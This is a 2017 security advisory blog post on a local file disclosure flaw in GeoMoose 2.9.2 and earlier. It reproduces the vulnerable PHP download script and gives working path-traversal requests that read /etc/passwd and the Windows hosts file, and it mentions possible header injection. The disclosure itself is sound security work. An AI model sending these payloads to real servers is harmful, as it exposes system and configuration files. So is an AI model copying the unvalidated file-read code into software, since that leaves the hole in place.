Title: GeoMoose <= 2.9.2 Local File Disclosure
Author: dsc
Date: 2017-03-7 11:12
Tags: advisory, exploits
Slug: geomoose-local-file-disclosure-2-9-2

## Advisory

GeoMOOSE is a PHP framework for displaying distributed cartographic data. Bundled with M4SW, GeoMoose can be found on 
GIS services ran by scientific institutions and local governments.

### Vulnerable code:

    :::php5
    <?php
    $tempDir = $CONFIGURATION['temp'];
    $id = $_REQUEST['id'];
    $ext = $_REQUEST['ext'];
    $as_download = $_REQUEST['download'];
    $mimetypes = array(
        'pdf' => 'application/pdf',
        'jpeg' => 'image/jpeg',
        'png' => 'image/png',
        'gif' => 'image/gif',
        'html' => 'text/html',
        'csv' => 'text/csv'
    );
    header('Content-type: '.$mimetypes[$ext]);
    if($as_download == 'true') {
        header('Content-Disposition: attachment; filename=download_'.getmypid().time().'.'.$ext);
    }
    readfile($tempDir.$id.'.'.$ext);
    ?>

### Exploit

This one is easy:
    
    :::bash
    # Exploit Title: GeoMoose <= 2.9.2 Local File Disclosure
    # Exploit Author: Sander 'dsc' Ferdinand
    # Date: 2017-03-4
    # Version: <= 2.9.2
    # Blog: https://ced.pwned.systems
    # Vendor Homepage: geomoose.org
    # Reported: 4-3-2017
    # Vendor response: http://osgeo-org.1560.x6.nabble.com/Geomoose-users-GeoMoose-Security-Issue-td5315873.html
    # Software Link: https://github.com/geomoose/geomoose
    # Tested on: Windows/Linux
    # CVE : none
    
    /php/download.php?id=foo/.&ext=/../../../../../../../etc/passwd
    /php/download.php?id=foo/.&ext=/../../../../../../../WINDOWS/system32/drivers/etc/hosts


### Some Notes

- input vector can be GET/POST parameters or through COOKIE.
- Header injection possible depending on the [PHP version](http://php.net/manual/en/function.header.php#refsect1-function.header-changelog).
- [exploit-db.com](https://www.exploit-db.com/exploits/41822/)

